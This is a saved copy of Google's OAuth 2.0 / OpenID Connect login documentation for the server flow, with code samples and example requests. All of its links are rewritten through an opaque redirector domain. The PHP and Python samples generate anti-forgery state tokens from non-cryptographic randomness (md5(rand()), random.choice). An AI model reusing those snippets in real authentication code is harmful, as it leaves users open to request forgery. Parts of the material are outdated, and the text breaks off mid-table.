  body.docs section.expandable-no-left-margin {
    margin-left: 0;
  }
</style>






In the sidebar on the left, expand <b>APIs &amp; auth</b>.

Next, click <b>APIs</b>.

  
    
      In the list of APIs, make sure all of the APIs you are using show a status of <b>ON</b>.
    
  

</li>
  <li>In the sidebar on the left, select <b>Consent screen</b>.</li>
  <li>Fill out the form and click <b>Save</b>.</li>
</ol>

<p>The following consent dialog shows what a
user would see when a combination of OAuth 2.0 and Google Drive scopes are present in the request.
(This generic dialog was generated using the
<a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUaqbnKl1os9lAS19aWx%2Fk7shhhey2gfV2%2FP5c9zPoqhA">Google OAuth 2.0 Playground</a>, so it does not include branding
information that would be set in the Developers Console.)
</p>

<p>
<img src="OAuth2Login_files/nppxjoj_003.png" alt="Consent page screen shot">
</p>
<h2 id="accessingtheservice">Accessing the service</h2>
<p>
Google and third parties provide libraries that you can use to take care of many of the implementation
details of authenticating users and gaining access to Google APIs. Examples include <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUWoU%2FZxnh%2FsKsPRUgYjnlug%3D">Google+ Sign-In</a> and the <a href="#libraries">Google client libraries</a>, which are
available for a variety of platforms.
</p>

<aside class="note"><b>Note:</b> 
Given the security implications of getting the implementation correct, we strongly encourage you to
take advantage of a pre-written library or <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=CkJnT3bogvYzCC9R0QFkMiMO%2BXu3hQwwiMoUDz4282T0MKDyILq5NX0zPPTfufeq">service</a>. Authenticating users properly is
important to their and your safety and security, and using well-debugged code written by others is
generally a best practice. For more information, 
see <a href="#libraries">Client libraries</a>. 
</aside>
    <p>If you choose not to use a library, follow the instructions in the remainder of this document,
      which describes the HTTP request flows that underly the available libraries.</p>
    </section>
<section>
<h2 id="authenticatingtheuser">Authenticating the user</h2>
<p>
Authenticating the user involves obtaining an ID token and validating it. ID tokens are a standardized feature of <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=dGyTFdVU2m9zFFZIjubu5tOTL03v2zv6zZ3fjVBOaOE%3D">OpenID Connect</a> 
designed for use in sharing identity assertions on the Internet. 
</p>

<p>
The most commonly used approaches for authenticating a user and 
obtaining an ID token are called 
the "server" flow and the "implicit" flow. The server flow allows the 
back-end server of an application to verify the identity of the person 
using a browser or mobile 
device. The implicit flow is used when a client-side application 
(typically a JavaScript app running in the browser) needs to access APIs
 directly instead of via its back-end server.
</p>

<p>
This document describes how to perform the server flow for 
authenticating the user. The implicit flow is significantly more 
complicated because of security risks in handling and using tokens on 
the client side. If you need to implement an implicit flow, we highly 
recommend using <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjURAH7wFOzMLer8e%2BtnT5WCU%3D">Google+ Sign-In</a>. 
</p>

<h3>Server flow</h3>
<p>
Make sure you <a href="#appsetup">set up your app in the Developers Console</a> to enable it to use these protocols
and authenticate your users. When a user tries to log in with Google, you need to:
</p>

<ol>
<li><a href="#createxsrftoken">Create an anti-forgery state token</a>
</li><li><a href="#sendauthrequest">Send an authentication request to Google</a>
</li><li><a href="#confirmxsrftoken">Confirm the anti-forgery state token</a>
</li><li><a href="#exchangecode">Exchange <code>code</code> for access token and ID token</a>
</li><li><a href="#obtainuserinfo">Obtain user information from the ID token</a>
</li><li><a href="#authuser">Authenticate the user</a>
</li></ol>

<h4 id="createxsrftoken">1. Create an anti-forgery state token</h4>
<p>You must protect the security of your users by preventing request 
forgery attacks. The first step is creating a unique session token that 
holds state between your app and the user's client.  You later match 
this unique session token with the authentication response returned by 
the Google OAuth Login service to verify that the user is making the 
request and not a malicious attacker. These tokens are often referred to
 as cross-site request forgery (<a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=NjYxiRc%2F0XwBb4vpJe0w2lwDytLsaftsKN2Za2CPm%2F9hWVZ5OR1Bym0dels13P6wvR4DktuJiUwLIb0k%2BZPRCA%3D%3D">CSRF</a>) tokens.</p>
<p>One good choice for a state token is a string of 30 or so characters constructed using a 
high-quality random-number generator. Another is a hash generated by signing some of your session 
state variables with a key that is kept secret on your back-end.</p>

<p>The following code demonstrates generating unique session tokens.</p>
<div class="ds-selector-tabs">
  <section>
    <h3>PHP</h3>
    You must download the
    <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=PARdxb6WX0fldzmyI3TGIjcq7RJZrvKxYm1G%2Bu7H6J47PPTl6ipeQp8J7uG8QlK5">Google APIs client library for PHP</a> to use this sample.
  <pre class="prettyprint">  // Create a state token to prevent request forgery.
  // Store it in the session for later validation.
  $state = md5(rand());
  $app['session']-&gt;set('state', $state);
  // Set the client ID, token state, and application name in the HTML while
  // serving it.
  return $app['twig']-&gt;render('index.html', array(
      'CLIENT_ID' =&gt; CLIENT_ID,
      'STATE' =&gt; $state,
      'APPLICATION_NAME' =&gt; APPLICATION_NAME
  ));
  </pre>
  </section>
  <section>
    <h3>Java</h3>
    You must download the
    <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=PARdxb6WX0fldzmyI3TGIjcq7RJZrvKxYm1G%2Bu7H6J5D7Ls5eYkdIctLPT7V%2BkSPehdvmQlXObyk4MyEOGTCag%3D%3D">Google APIs client library for Java</a> to use this sample.
  <pre class="prettyprint">  // Create a state token to prevent request forgery.
  // Store it in the session for later validation.
  String state = new BigInteger(130, new SecureRandom()).toString(32);
  request.session().attribute("state", state);
  // Read index.html into memory, and set the client ID,
  // token state, and application name in the HTML before serving it.
  return new Scanner(new File("index.html"), "UTF-8")
      .useDelimiter("\\A").next()
      .replaceAll("[{]{2}\\s*CLIENT_ID\\s*[}]{2}", CLIENT_ID)
      .replaceAll("[{]{2}\\s*STATE\\s*[}]{2}", state)
      .replaceAll("[{]{2}\\s*APPLICATION_NAME\\s*[}]{2}",
                  APPLICATION_NAME);
  </pre>
  </section>
  <section>
    <h3>Python</h3>
    You must download the
    <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=PARdxb6WX0fldzmyI3TGIjcq7RJZrvKxYm1G%2Bu7H6J480YwcuEy8YtH3nXD8GCsuRpURg4U0B4VJVYonqwMujQ%3D%3D">Google APIs client library for Python</a> to use this sample.
  <pre class="prettyprint">  # Create a state token to prevent request forgery.
  # Store it in the session for later validation.
  state = ''.join(random.choice(string.ascii_uppercase + string.digits)
                  for x in xrange(32))
  session['state'] = state
  # Set the client ID, token state, and application name in the HTML while
  # serving it.
  response = make_response(
      render_template('index.html',
                      CLIENT_ID=CLIENT_ID,
                      STATE=state,
                      APPLICATION_NAME=APPLICATION_NAME))
  </pre>
  </section>
</div>

<h4 id="sendauthrequest">2. Send an authentication request to Google</h4>
<p>
The next step is forming an HTTPS <code>GET</code> request with the 
appropriate URI parameters. Note the use of HTTPS rather than HTTP in 
all the steps of this process; HTTP connections are refused. You should 
retrieve the base URI from the <a href="#discovery">Discovery document</a> using the key <code>authorization_endpoint</code>. The following discussion assumes the base URI is <code>https://accounts.google.com/o/oauth2/auth</code>.
</p>
<p>For a basic request, specify the following parameters:</p>

<ul>
<li><code>client_id</code>, which you obtain from the <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=QLOG3w7JKFpRpNbyDrWR9EsO7IGWc300jOT8FfZGV%2FmXIa1gomT6tSKKRp6XgHv%2F">Developers Console</a>.
</li><li><code>response_type</code>, which in a basic request should be <code>code</code>. (Read more at <a href="#response-type"><code>response_type</code></a>.)
</li><li><code>scope</code>, which in a basic request should be <code>openid email</code>. (Read more at <a href="#scope-param"><code>scope</code></a>.)
</li><li><code>redirect_uri</code> should be the HTTP endpoint on your server that will receive the response from Google. You specify this URI in the <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=QLOG3w7JKFpRpNbyDrWR9EsO7IGWc300jOT8FfZGV%2FmXIa1gomT6tSKKRp6XgHv%2F">Developers Console</a>.
</li><li><code>state</code> should include the value of the anti-forgery
 unique session token, as well as any other information needed to 
recover the context when the user returns to your application, e.g., the
 starting URL. (Read more at <a href="#state-param"><code>state</code></a>.)
</li><li><code>login_hint</code> can be the user's email address or the <code>sub</code> string, which
is equivalent to the user's Google ID. If you do not provide
a <code>login_hint</code> and the user is currently logged in, the consent screen includes
a request for approval to release the user’s email address to your app. (Read more at <a href="#login-hint"><code>login_hint</code></a>.)</li>
<li>Use the <code>openid.realm</code> if you are migrating an existing application from
OpenID 2.0 to OpenID Connect. For details, see <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6muKV%2BujHkUWRKQHIDtGqFzGAnqZ32fZYsPfTiXbli7Zg%3D%3D">
Migrating off of OpenID 2.0</a>.</li>
<li>Use the <code>hd</code> parameter only for Google Apps
hosted accounts. (Read more at <a href="#hd-param"><code>hd</code></a>.)</li>
</ul>
<aside class="note"><b>Note:</b> Only the most commonly used parameters are listed above. For 
a complete list, plus more details about all the parameters, 
see <a href="#authenticationuriparameters">Authentication URI parameters</a>.</aside> 

<p>
Here is an example of a complete OpenID Connect authentication URI, with line breaks and spaces for readability:
</p>

<pre>https://accounts.google.com/o/oauth2/auth?
&nbsp;client_id=424911365001.apps.googleusercontent.com&amp;
&nbsp;response_type=code&amp;
&nbsp;scope=openid%20email&amp;
&nbsp;redirect_uri=https://oa2cb.example.com/&amp;
&nbsp;state=security_token%3D138r5719ru3e1%26url%3Dhttps://oa2cb.example.com/myHome&amp;
&nbsp;login_hint=jsmith@example.com&amp;
&nbsp;openid.realm=example.com&amp;
&nbsp;hd=example.com
</pre>

<p>
Users are required to give consent if your app requests any new information about them, or if your app 
requests account access that they have not previously approved.
</p>


<h4 id="confirmxsrftoken">3. Confirm anti-forgery state token</h4>
<p>
The response is sent to the <code>redirect_uri</code> that you specified in the 
<a href="#sendauthrequest">request</a>. All responses are returned in the query string, as shown below:
</p>

<pre>https://oa2cb.example.com/code?state=security_token%3D138r5719ru3e1%26url%3Dhttps://oa2cb.example.com/myHome&amp;code=4/P7q7W91a-oMsCeLvIaQm6bTrgtp7
</pre>

<p>On the server, you must confirm that the <code>state</code> received from Google
matches the session token you created in <a href="#createxsrftoken">Step 1</a>.
This round-trip verification helps to ensure that the user, not a malicious script, is making
the request.</p>
<p>The following code demonstrates confirming the session tokens that
you created in Step 1:</p>
<div class="ds-selector-tabs">
  <section>
    <h3>PHP</h3>
    You must download the
    <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=PARdxb6WX0fldzmyI3TGIjcq7RJZrvKxYm1G%2Bu7H6J47PPTl6ipeQp8J7uG8QlK5">Google APIs
      client library for PHP</a> to use this sample.
  <pre class="prettyprint">  // Ensure that there is no request forgery going on, and that the user
  // sending us this connect request is the user that was supposed to.
  if ($request-&gt;get('state') != ($app['session']-&gt;get('state'))) {
    return new Response('Invalid state parameter', 401);
  }
  </pre>
  </section>
  <section>
    <h3>Java</h3>
    You must download the
    <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=PARdxb6WX0fldzmyI3TGIjcq7RJZrvKxYm1G%2Bu7H6J5D7Ls5eYkdIctLPT7V%2BkSPehdvmQlXObyk4MyEOGTCag%3D%3D">Google APIs
      client library for Java</a> to use this sample.
  <pre class="prettyprint">  // Ensure that there is no request forgery going on, and that the user
  // sending us this connect request is the user that was supposed to.
  if (!request.queryParams("state").equals(
      request.session().attribute("state"))) {
    response.status(401);
    return GSON.toJson("Invalid state parameter.");
  }
  </pre>
  </section>
  <section>
    <h3>Python</h3>
    You must download the
    <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=PARdxb6WX0fldzmyI3TGIjcq7RJZrvKxYm1G%2Bu7H6J480YwcuEy8YtH3nXD8GCsuRpURg4U0B4VJVYonqwMujQ%3D%3D">Google APIs
      client library for Python</a> to use this sample.
  <pre class="prettyprint">  # Ensure that the request is not a forgery and that the user sending
  # this connect request is the expected user.
  if request.args.get('state', '') != session['state']:
    response = make_response(json.dumps('Invalid state parameter.'), 401)
    response.headers['Content-Type'] = 'application/json'
    return response
  </pre>
  </section>
</div>

<h4 id="exchangecode">4. Exchange <code>code</code> for access token and ID token</h4>
<p>
The response includes a <code>code</code> parameter, a one-time authorization code that your server 
can exchange for an access token and ID token. Your server makes this exchange by sending an HTTPS 
<code>POST</code> request.
The <code>POST</code> request is sent to the token endpoint, which you should retrieve from the <a href="#discovery">Discovery document</a> using the key <code>token_endpoint</code>. The following discussion assumes the endpoint is <code>https://accounts.google.com/o/oauth2/token</code>. The request must include the following parameters in the <code>POST</code> body:
</p>

<table>
  <tbody><tr>
  <th>Field</th>
  <th>Description</th>
  </tr>
  <tr>
    <td><code>code</code></td>
    <td>The authorization code that is returned from <a href="#sendauthrequest">the initial request</a>.</td>
  </tr>
  <tr>
    <td><code>client_id</code></td>
    <td>The client ID that you obtain from the <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=QLOG3w7JKFpRpNbyDrWR9EsO7IGWc300jOT8FfZGV%2FmXIa1gomT6tSKKRp6XgHv%2F">Developers Console</a>, as described in
      <a href="#getcredentials">Obtain OAuth 2.0 credentials</a>.</td>
  </tr>
  <tr>
    <td><code>client_secret</code></td>
    <td>The client secret that you obtain from the Developers Console, as described in
      <a href="#getcredentials">Obtain OAuth 2.0 credentials</a>.</td>
  </tr>
  <tr>
    <td><code>redirect_uri</code></td>
    <td>The URI that you specify in the Developers Console, as described in
      <a href="#setredirecturi">Set a redirect URI</a>.</td>
  </tr>
  <tr>
    <td><code>grant_type</code></td>
    <td>This field must contain a value of <code>authorization_code</code>, as defined in the OAuth 2.0 specification.</td>
  </tr>
</tbody></table>

<p>
The actual request might look like the following example:
</p>

<pre>POST /o/oauth2/token HTTP/1.1
Host: accounts.google.com
Content-Type: application/x-www-form-urlencoded

code=4/P7q7W91a-oMsCeLvIaQm6bTrgtp7&amp;
client_id=8819981768.apps.googleusercontent.com&amp;
client_secret={client_secret}&amp;
redirect_uri=https://oauth2-login-demo.appspot.com/code&amp;
grant_type=authorization_code
</pre>

<p>
A successful response to this request contains the following fields in a JSON array:
</p>
<table>
  <tbody><tr><th>Field</th>
  <th>Description</th>
  </tr><tr>
    <td><code>access_token</code></td>
    <td>A token that can be sent to a Google API.</td>
  </tr>
  <tr>
    <td><code>id_token</code></td>
    <td>A <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=dGyTFdVU2m9zFFZIjubu5osuuEo4dRBDfK6Gf28z9FYazjqUWBELyXKK1yTqMxLl0nUZ7aSB%2B1NNouQQfXxSbw%3D%3D">JWT</a> that contains identity information about the user that is digitally signed by Google.
    </td>
  </tr>
  <tr>
    <td><code>expires_in</code></td>
    <td>The remaining lifetime of the access token.</td>
  </tr>
  <tr>
    <td><code>token_type</code></td>
    <td>Identifies the type of token returned. At this time, this field always has the value <code>Bearer</code>.</td>
  </tr>
  <tr>
    <td><code>refresh_token</code> (optional)</td>
    <td>This field is only present if <code>access_type=offline</code> is included in 
the <a href="#sendauthrequest">authentication request</a>. For details, see 
<a href="#refresh-tokens">Refresh tokens</a>.</td>
  </tr>
</tbody></table>
<aside class="note"><strong>Note: </strong>There is a limit to the number of tokens per Google
  user account, and any authentication request above this limit might quietly invalidate the oldest
  outstanding token. For details, see <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6lMeaLChgjDkbYUlrMEZs5l7GzRwxKaOtUj7j7tPrG%2FsQ%3D%3D##expiration">Token expiration</a>.</aside>
<h4 id="obtainuserinfo">5. Obtain user information from the ID token</h4>
<p>
An ID token is a cryptographically signed JSON object encoded in base 64.  Normally, it is critical that you <a href="#validatinganidtoken">validate an ID token</a>
 before you use it, but since you are communicating directly with Google
 over an intermediary-free HTTPS channel and using your client secret to
 authenticate yourself to Google, you can be confident that the token 
you receive really comes from Google and is valid.  If your server 
passes the ID token to other components of your app, it is extremely 
important that the other components <a href="#validatinganidtoken">validate the token</a> before using it.
</p>

<p>
Since most API libraries combine the validation with the work of 
decoding the base64 and parsing the JSON, you will probably end up 
validating the token anyway as you access the fields in the ID token.
</p>

<strong>An ID token's payload</strong>
<p>
An ID token is a JSON object containing a set of name/value pairs. Here’s an example, formatted for readability:
</p>

<pre>{"iss":"accounts.google.com",
 "at_hash":"HK6E_P6Dh8Y93mRNtsDB1Q",
 "email_verified":"true",
 "sub":"10769150350006150715113082367",
 "azp":"1234987819200.apps.googleusercontent.com",
 "email":"jsmith@example.com",
 "aud":"1234987819200.apps.googleusercontent.com",
 "iat":1353601026,
 "exp":1353604926 }
</pre>

<p>
Google uses the following fields:
</p>

<table>
  <tbody><tr><th>Parameter</th>
  <th>Required</th>
  <th>Description</th>

  </tr><tr>
  <td><code>iss</code>
  </td>
  <td>always
  </td>
  <td>The Issuer Identifier for the Issuer of the response.
  </td>
  </tr>

  <tr>
  <td><code>at_hash</code>
  </td>
  <td>
  </td>
  <td>Access token hash. Provides validation that the access token is 
tied to the identity token. If the ID token is issued with an access 
token in the server flow, this is always included. This can be used as 
an alternate mechanism to protect against cross-site request forgery 
attacks, but if you follow <a href="#createxsrftoken">Step 1</a> and <a href="#confirmxsrftoken">Step 3</a> it is not necessary to verify the access token.
  </td>
  </tr>

  <tr>
  <td><code>email_verified</code>
  </td>
  <td>
  </td>
  <td>True if the user's e-mail address has been verified; otherwise false.
  </td>
  </tr>

  <tr>
  <td><code>sub</code>
  </td>
  <td>always
  </td>
  <td>
An identifier for the user, unique among all Google accounts and never 
reused. A Google account can have multiple emails at different points in
 time, but the <code>sub</code> value is never changed. Use <code>sub</code> within your application as the unique-identifier key for the user.
  </td>
  </tr>

  <tr>
  <td><code>azp</code>
  </td>
  <td>
  </td>
  <td>The <code>client_id</code> of the authorized presenter. This claim
 is only needed when the party requesting the ID token is not the same 
as the audience of the ID token. This may be the case at Google for 
hybrid apps where a web application and Android app have a different <code>client_id</code> but share the same project.
  </td>
  </tr>

  <tr>
  <td><code>email</code>
  </td>
  <td>
  </td>
  <td>
The user’s email address. This may not be unique and is not suitable for
 use as a primary key.  Provided only if your scope included the string 
"email".
  </td>
  </tr>

  <tr>
  <td><code>aud</code>
  </td>
  <td>always
  </td>
  <td>
Identifies the audience that this ID token is intended for. It must be one of the OAuth 2.0 client IDs of your application.
  </td>
  </tr>

  <tr>
  <td><code>iat</code>
  </td>
  <td>always
  </td>
  <td>
An integer giving the time the ID token was issued, in seconds since the beginning of 1970, UTC.
  </td>
  </tr>

  <tr>
  <td><code>exp</code>
  </td>
  <td>always
  </td>
  <td>
An integer giving the time the ID token expires, in seconds since the beginning of 1970, UTC.
  </td>
  </tr>
</tbody></table>

<h4 id="authuser">6. Authenticate the user</h4>
<p>
After obtaining user information from the ID token, you should query 
your app's user database. If the user already exists in your database, 
you should start an application session for that user.
</p>

<p>
If the user does not exist in your user database, you should redirect 
the user to your new-user sign-up flow. You may be able to auto-register
 the user based on the information you receive from Google, or at the 
very least you may be able to pre-populate many of the fields that you 
require on your registration form. In addition to the information in the
 ID token, you can get additional <a href="#obtaininguserprofileinformation">user profile information</a> at our user profile endpoints.
</p>
    </section>

<section>
<h2 id="advancedtopics">Advanced topics</h2>
<p>
The following sections describe the Google OAuth 2.0 API in greater 
detail. This information is intended for developers with advanced 
requirements around authentication and authorization.
</p>

<h3 id="offlineaccess">Access to other Google APIs</h3>
<p>
One of the advantages of using OAuth 2.0 for authentication is that your application can get
permission to use other Google APIs (such as YouTube, Google Drive, Calendar, or Contacts) at the same
time as you authenticate the user. To do this, include the other scopes that you need in the <a href="#sendauthrequest">authentication request</a> that you send to Google. For example, to add Google
Drive access to your authentication request, pass a scope parameter of <code>openid 
email https://www.googleapis.com/auth/drive</code>. The user is prompted appropriately on the <a href="#consentpageexperience">consent screen</a>. The access token that you receive back from Google
allows you to access all the APIs related to the scopes you requested.
</p>

<aside class="note"><strong>Note</strong>: If your application is asking for many scopes, the
consent screen contains many lines of text. The more scopes your application requests, the less
likely it is that the user will consent, so your application should ask only for the scopes it
needs.</aside>

<h3 id="refresh-tokens">Refresh tokens</h3>
<p>
In your request for API access you can request a refresh token to be returned during the <a href="#exchangecode"><code>code</code> exchange</a>. A refresh token provides your app continuous access to
Google APIs while the user is not logged into your application. To request a
refresh token, add <code>access_type=offline</code> to the <a href="#sendauthrequest">authentication request</a>. 
</p>

<p>Considerations:
</p><ul><li>Be sure to store the refresh token safely and permanently, because you can only obtain a refresh
token the first time that you perform the code exchange flow. 
</li>

<li>
There are limits on the number of refresh token that are issued—one limit per client/user
combination, and another per user across all clients. If your application requests too many refresh
tokens, it may run into these limits, in which case older refresh tokens stop working.
</li></ul>

<p>
For more information, see <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6lMeaLChgjDkbYUlrMEZs5lsj2Hvszf85ItaBHsdSXH2GvKSaExqyY8WPJdexsyyrI%3D##offline">Offline Access</a> and 
<a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6lMeaLChgjDkbYUlrMEZs5lTabs63Aw5Nvy51vryOTeBHQV4thfeAUcAoQAHTKQsNY%3D##refresh">Using a refresh token</a>.
</p>
<h3 id="re-consent">Prompting re-consent</h3>
<p>
You can prompt the user to re-authorize your app by adding the <code>prompt=consent</code> parameter
to the <a href="#sendauthrequest">authentication request</a>. When <code>prompt=consent</code> is 
included, the consent screen is displayed every time the user logs into your app. For this reason, 
include <code>prompt=consent</code> only when necessary.</p>
<p>For more about the 
<code>prompt</code> parameter, see <a href="#prompt">prompt</a> in the URI parameter table.</p>

<h3 id="authenticationuriparameters">Authentication URI parameters</h3>
<p>
The following table gives more complete descriptions of the parameters accepted by Google's OAuth 2.0 authentication API.
</p>

<table>
  <tbody><tr><th>Parameter</th>
  <th>Required</th>
  <th>Description</th>

  </tr><tr>
  <td><code>client_id</code>
  </td>
  <td>(Required)
  </td>
  <td>The client ID string that you obtain from the <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=QLOG3w7JKFpRpNbyDrWR9EsO7IGWc300jOT8FfZGV%2FmXIa1gomT6tSKKRp6XgHv%2F">Developers Console</a>, as described in
    <a href="#getcredentials">Obtain OAuth 2.0 credentials</a>.
  </td>
  </tr>

  <tr>
  <td id="response-type"><code>response_type</code>
  </td>
  <td>(Required)
  </td>
  <td>If the value is <code>code</code>, launches a Basic flow, requiring a <code>POST</code> to the token endpoint to obtain the tokens.  If the value is <code>token id_token</code> or <code>id_token token</code>, launches an Implicit flow, requiring the use of Javascript at the redirect URI to retrieve tokens from the URI <code>#fragment</code>. 
  </td>
  </tr>

  <tr>
  <td id="scope-param"><code>scope</code>
  </td>
  <td>(Required)
  </td>
  <td><p>The scope value must begin with the string <code>openid</code> and then include <code>profile</code> or <code>email</code> or both. 
</p>

<p>If <code>email</code> is present, the ID token includes <code>email</code> and <code>email_verified</code> claims.  
</p>
<p>
In addition to these OpenID-specific scopes, your scope argument can 
also include other scope strings. All scope strings must be 
space-separated.
For example, if you wanted per-file access to a user’s Google Drive, 
your scope might be <code>openid profile email https://www.googleapis.com/auth/drive.file</code>. 
</p>
<p>For 
    information about available login scopes, see 
    <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUWoU%2FZxnh%2FsKsPRUgYjnluhfskLDMyeu1oS0MoGE7DW5yIiMTGEVJYTHvGTK4%2BOmAg%3D%3D##login-scopes">Login scopes</a>. To see the available scopes for all Google APIs, 
visit the <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUVNh3XL7%2Bu%2BfbTRe7HjF75tIArzfvajHle9HMbzrNPrI##p/">APIs Explorer</a>.</p>

  </td>
  </tr>

  <tr>
  <td id="redirect"><code>redirect_uri</code>
  </td>
  <td>(Required)
  </td>
  <td>Determines where the response is sent. The value of this parameter must exactly match one of the values that you set in the <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=QLOG3w7JKFpRpNbyDrWR9EsO7IGWc300jOT8FfZGV%2FmXIa1gomT6tSKKRp6XgHv%2F">Google Developers Console</a> (including the HTTP or HTTPS scheme, case, and trailing '/', if any).
  </td>
  </tr>

  <tr>
  <td id="state-param"><code>state</code>
  </td>
  <td>(Optional, but strongly recommended)
  </td>
  <td><p>An opaque string that is round-tripped in the protocol; that is to say, it is returned as a
URI parameter in the Basic flow, and in the URI <code>#fragment</code> in the Implicit flow.</p>
<p>The <code>state</code> can be useful for correlating requests and responses. Because your 
<code>redirect_uri</code> can be guessed, using a <code>state</code> value can increase your assurance 
that an incoming connection is the result of an authentication request.  If you <a href="#createxsrftoken">generate a random
string</a> or encode the hash of some client state (e.g., a
cookie) in this <code>state</code> variable, you can validate the response to additionally ensure 
that the request and response originated in the same browser. This provides protection against
attacks such as cross-site request forgery.</p>
  </td>
  </tr>

  <tr>
  <td id="prompt"><code>prompt</code>
  </td>
  <td>(Optional)
  </td>
  <td>A space-delimited list of string values that specifies whether the
 authorization server prompts the user for reauthentication and consent.
 The possible values are:
<ul>
<li><code>none</code><br>
The authorization server does not display any authentication or user 
consent screens; it will return an error if the user is not already 
authenticated and has not  pre-configured consent for the requested 
scopes. You can use <code>none</code> to check for existing authentication and/or consent.

</li><li><code>consent</code><br>
The authorization server prompts the user for consent before returning information to the client.

</li><li><code>select_account</code><br>
The authorization server prompts the user to select a user account. This
 allows a user who has multiple accounts at the authorization server to 
select amongst the multiple accounts that they may have current sessions
 for.
</li></ul>
If no value is specified and the user has not previously authorized access, then the user is shown a consent screen.
  </td>
  </tr>

  <tr>
  <td><code>display</code>
  </td>
  <td>(Optional)
  </td>
  <td>An ASCII string value for specifying how the authorization server 
displays the authentication and consent user interface pages. The 
following values are specified, and accepted by the Google servers, but 
do not have any effect on its behavior: <code>page</code>, <code>popup</code>, <code>touch</code>, and <code>wap</code>.
  </td>
  </tr>

  <tr>
  <td><code>login_hint</code>
  </td>
  <td>(Optional)
  </td>
  <td id="login-hint">When your app knows which user it is trying to authenticate, it can provide this parameter as 
a hint to the authentication server. Passing this hint suppresses the account chooser and either 
pre-fill the email box on the sign-in form, or select the proper session (if the user is using 
<a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=Kj5LLqq2wim%2BivUSPHX%2B1zXxsKsL2A22os4VZR5x0grRifcn9mw7BhaA11zOTiwZ%2FKU%2F9OtiP0yPn2r86qtkoA%3D%3D">multiple 
sign-in</a>), which can help you avoid problems that occur if your app logs in the wrong 
user account. The value can be either an email 
address or the <code>sub</code> string, which is equivalent to the user's Google ID.
  </td>
  </tr>

  <tr>
  <td><code>access_type</code>
  </td>
  <td>(Optional)
  </td>
  <td>The allowed values are <code>offline</code> and <code>online</code>. The effect is documented in <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6lMeaLChgjDkbYUlrMEZs5lsj2Hvszf85ItaBHsdSXH2GvKSaExqyY8WPJdexsyyrI%3D##offline">Offline Access</a>; if an access token is being requested, the client does not receive a refresh token unless <code>offline</code> is specified.
  </td>
  </tr>
  <tr>
    <td><code>include_granted_scopes</code></td>
    <td><code>true</code> or <code>false</code></td>
    <td> If this is provided with the value <code>true</code>, and the 
authorization request is granted, the authorization will include any 
previous authorizations granted to this user/application combination for
 other scopes; see <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6lMeaLChgjDkbYUlrMEZs5lKP3f%2FMTO8uk%2FGewdb8qGwI73VaThV2jivAv9aifwtSQ%3D##incrementalAuth">Incremental Authorization</a>.</td>
  </tr>

  <tr>
  <td><code>openid.realm</code>
  </td>
  <td>(Optional)
  </td>
  <td><code>openid.realm</code> is a parameter from the OpenID 2.0 protocol, not from OAuth 2.0.
It is used in OpenID 2.0 requests to signify the URL-space for which an
authentication request is valid. Use <code>openid.realm</code> if you are migrating an existing application from
OpenID 2.0 to OpenID Connect. For more details, see <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbzRJ7wdTb8dN98SGdGqt6muKV%2BujHkUWRKQHIDtGqFzGAnqZ32fZYsPfTiXbli7Zg%3D%3D">
Migrating off of OpenID 2.0</a>.
  </td>
  </tr>
  <tr>
  <td id="hd-param"><code>hd</code>
  </td>
  <td>(Optional)
  </td>
  <td>The <code>hd</code> (hosted domain) parameter streamlines the login process for Google Apps hosted
  accounts. By including the domain of the user (for example, <code>mycollege.edu</code>), you 
restrict sign-in to accounts at that domain. For Google Apps customers that have SAML set up with their own authentication
